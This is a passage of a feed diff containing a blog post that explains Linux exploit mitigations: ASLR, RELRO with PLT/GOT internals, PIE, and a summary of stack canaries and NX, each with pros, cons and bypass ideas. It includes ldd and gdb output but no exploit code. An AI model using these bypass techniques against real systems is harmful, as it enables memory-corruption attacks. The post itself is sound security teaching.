+<p>Address Space Layout Randomization, or ASLR for short, would kill the technique used in the previous section. As the name implies, it randomizes the address space layout. This means that each time you run the program, the stack and heap will be in a different addresses. And libc (and all other libs used) will also be in different random addresses.</p>
+<p>This kills our previous approach, since we relied on libc gadgets (and now we don&rsquo;t know where they are) and on knowing the stack address (which will be different on every execution).</p>
+<p>Or does it?</p>
+<h3 id="bypassing-aslr">Bypassing ASLR?</h3>
+<p>There are two main ways to bypass ASLR. The first is leaking a libc address. If one single libc function address is leaked, we can calculate the offset and find out where all the gadgets are! However, that would depend on a second vulnerability to leak the address. This is not extremely improbable, but will not happen in our silly example.</p>
+<p>The other relies on reusing only the program code. The .TEXT section will not be randomized in ASLR, so we have our entire program to find gadgets. Our silly example is not that long, meaning we won&rsquo;t find many useful gadgets there.</p>
+<p>It&rsquo;s a shame that we will not demonstrate ASLR bypass in this post. However, I&rsquo;ll make room for one in the future. (Actually, I have been writting one for a while now and should be out soon.)</p>
+<h2 id="relro">RELRO</h2>
+<p>Before talking about RELRO, first a word or two must be spoken on Procedure Linkage Table (PLT) and Global Offset Table (GOT). In our program we call the libc functions &ldquo;printf&rdquo; and &ldquo;gets&rdquo;. If ASLR is disabled, these libc functions will always have the same address, as may be seen with the use of <code>ldd</code> program:</p>
+<pre><code>└────╼ ldd test
+	linux-vdso.so.1 (0x00007ffff7ffa000)
+	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
+└────╼ ldd test
+	linux-vdso.so.1 (0x00007ffff7ffa000)
+	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
+└────╼ ldd test
+	linux-vdso.so.1 (0x00007ffff7ffa000)
+	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
+</code></pre><p>Note that libc addresses remain the same on every execution. However, look what happens when ASLR is enabled:</p>
+<pre><code>└────╼ ldd test
+	linux-vdso.so.1 (0x00007ffe4ed82000)
+	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5016311000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007f5016702000)
+└────╼ ldd test
+	linux-vdso.so.1 (0x00007ffe621a3000)
+	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc0abf36000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007fc0ac327000)
+└────╼ ldd test
+	linux-vdso.so.1 (0x00007ffe377ac000)
+	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1ec5854000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007f1ec5c45000)
+</code></pre><p>The addresses are different everytime! Libc is loaded dinamically in runtime. This makes the program smaller and makes updates on libc easier, as the program does not have to be recompiled upon every libc update. But when printf or gets is called upon, how does it know the address to call?</p>
+<p>Well, PLT and GOT are the two answers. When the program calls a function - such as printf - it will not call libc&rsquo;s function directly. Instead, it will call a wrapper in the PLT:</p>
+<pre><code>gdb-peda$ disass main
+Dump of assembler code for function main:
+...
+   0x000000000040055b &lt;+46&gt;:	call   0x4003f0 &lt;printf@plt&gt;
+...
+</code></pre><p>Let&rsquo;s see what&rsquo;s up in 0x4003f0 address:</p>
+<pre><code>gdb-peda$ disass 0x4003f0
+Dump of assembler code for function printf@plt:
+   0x00000000004003f0 &lt;+0&gt;:	jmp    QWORD PTR [rip+0x2005aa]        # 0x6009a0
+   0x00000000004003f6 &lt;+6&gt;:	push   0x0
+   0x00000000004003fb &lt;+11&gt;:	jmp    0x4003e0
+End of assembler dump.
+</code></pre><p>If we disassamble 0x6009a0, we get something in the GOT:</p>
+<pre><code>gdb-peda$ disass 0x6009a0
+Dump of assembler code for function _GLOBAL_OFFSET_TABLE_:
+   0x0000000000600988:	test   al,0x7
+   0x000000000060098a:	(bad)  
+   0x000000000060098b:	add    BYTE PTR [rax],al
+   0x000000000060098d:	add    BYTE PTR [rax],al
+   0x000000000060098f:	add    BYTE PTR [rax+0x31],dh
+   0x0000000000600992:	xor    al,0x24
+   0x0000000000600994:	in     al,0x7f
+   0x0000000000600996:	add    BYTE PTR [rax],al
+   0x0000000000600998:	rex clc 
+   0x000000000060099a:	adc    ah,BYTE PTR [rsp+riz*8]
+   0x000000000060099d:	jg     0x60099f
+   0x000000000060099f:	add    BYTE PTR [rax-0x41],dh
+   0x00000000006009a2:	fsub   DWORD PTR [rbx]
+   0x00000000006009a4:	in     al,0x7f
+   0x00000000006009a6:	add    BYTE PTR [rax],al
+   0x00000000006009a8:	nop
+   0x00000000006009a9:	jno    0x600985
+   0x00000000006009ab:	and    esp,esp
+   0x00000000006009ad:	jg     0x6009af
+   0x00000000006009af:	add    BYTE PTR [rax],al
+End of assembler dump.
+</code></pre><p>So what the hell is that?</p>
+<p>Since the compiler does not know where to find printf, it makes a wrapper in a memory region just before .TEXT called PLT. This guy is a wrapper to the GOT, another memory region. That&rsquo;s where things get interesting.</p>
+<p>On the first time printf is called on the GOT, it still does not know how to find the libc function. But it will try and find it. When it finds it in libc (a process called dynamic linking), it will redirect to that function&rsquo;s address. It will also rewrite itself so that in the next time printf is called it already knows where to find it.</p>
+<p>A possible attack is to rewrite the PLT or the GOT so it overwrites the pointer to printf function, making it point to somewhere malicious. This can be achieved through an overflow or arbitrary write, for instance.</p>
+<p>RELRO, or Relocation Read-Only, is fully enabled, it will prevent from writing in the PLT or GOT, making the forementioned attack impossible. However, it has an overhead to entirely populate the GOT before the main function gets executed.</p>
+<p>There&rsquo;s no bypass to this mitigation that I know of. Except, of course, for using a different approach.</p>
+<h2 id="pie">PIE</h2>
+<p>Position Independent Executables (PIE) provides an extra layer of protection which makes return oriented programming very difficult. We have seen that ASLR will randomize a few parts of the program, but an adversary may still use the .TEXT region for gadgets. PIE randomizes the offset of almost every memory region in the binary. However, this causes a great performance overhead.</p>
+<p>To bypass this mitigation, one must have a leaked address to calculate the offset and compensate.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Let&rsquo;s do a TL;DR here:</p>
+<h3 id="stack-canary-1">Stack canary</h3>
+<p>A semi-random 8 bytes long integer before the return address so it can&rsquo;t be overwritten by exploiting a stack buffer overflow.</p>
+<p><strong>Pros</strong>: very effective against stack buffer overflow. The performance overhead is minimal.</p>
+<p><strong>Cons</strong>: Does not protect against other memory corruption vulnerabilities.</p>
+<p><strong>Bypass</strong>: Leak the canary.</p>
+<h3 id="nx-1">NX</h3>
+<p>Prevents a few regions of the memory (such as the stack and heap) to be executed. With this mitigation, an adversary is unable to put new code into the program and has to do a code-reusage attack.</p>
+<p><strong>Pros</strong>: makes it impossible to add new code to the program. Prevent dangerous and unnecessary regions to be executed. The performance overhead is minimal.</p>
+<p><strong>Cons</strong>: does not offer much protection, as ret2libc is a fairly easy bypass.</p>
+<p><strong>Bypass</strong>: ret2lib, return oriented programming.</p>
+<h3 id="aslr-1">ASLR</h3>
+<p>Randomizes a few regions of the memory, such as stack, heap and libs.</p>
+<p><strong>Pros</strong>: effective to mitigate ret2libc attacks. It has a reasonable performance overhead, but not an issue.</p>
+<p><strong>Cons</strong>: does not prevent an adversary to use gadgets within the program.</p>
+<p><strong>Bypass</strong>: gadgets in the program and address leak.</p>
+<h3 id="relro-1">RELRO</h3>
+<p>Constructs the GOT before the main function is called and makes it unwritable.</p>
+<p><strong>Pros</strong>: kills attacks which relies on changing PLT or GOT.</p>
+<p><strong>Cons</strong>: other attacks are still possible. There&rsquo;s a performance overhead.</p>
+<p><strong>Bypass</strong>: none. Perhaps use another approach?</p>
+<h3 id="pie-1">PIE</h3>
+<p>Randomizes the entire program virtual memory.</p>
+<p><strong>Pros</strong>: very effective against code-reuse attacks (such as return oriented programming).</p>
+<p><strong>Cons</strong>: considerable performance overhead.</p>
+<p><strong>Bypass</strong>: address leak.</p>
+]]></content>
+		</item>
 		
 		<item>
 			<title>Cracking an OSCP-like buffer overflow</title>
